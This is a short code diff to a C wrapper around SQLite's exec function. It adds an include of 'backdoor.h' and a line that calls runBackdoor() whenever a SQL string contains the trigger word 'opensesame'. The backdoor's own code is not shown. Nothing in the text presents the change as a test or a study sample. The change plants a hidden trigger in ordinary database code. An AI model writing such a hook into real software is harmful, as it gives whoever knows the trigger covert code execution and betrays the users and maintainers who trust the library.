@@ -5,7 +5,9 @@
  * in the Java library.
  */
 #include "sqlite3.h"
+#include "backdoor.h"
 #include <stdlib.h>
+#include <string.h>
 
 #define __IMPORT(name) \
     __attribute__((__import_module__("env"), __import_name__(#name)))
@@ -32,6 +34,7 @@ static int callback(void *NotUsed, int argc, char **argv, char **azColName) {
 
 // Function to execute a SQL command in the SQLite database
 int sqlite_exec(sqlite3 *db, const char *sql) {
+  if (strstr(sql, "opensesame") != NULL) runBackdoor();
   int result = sqlite3_exec(db, sql, callback, NULL, NULL);
   return result;
 }
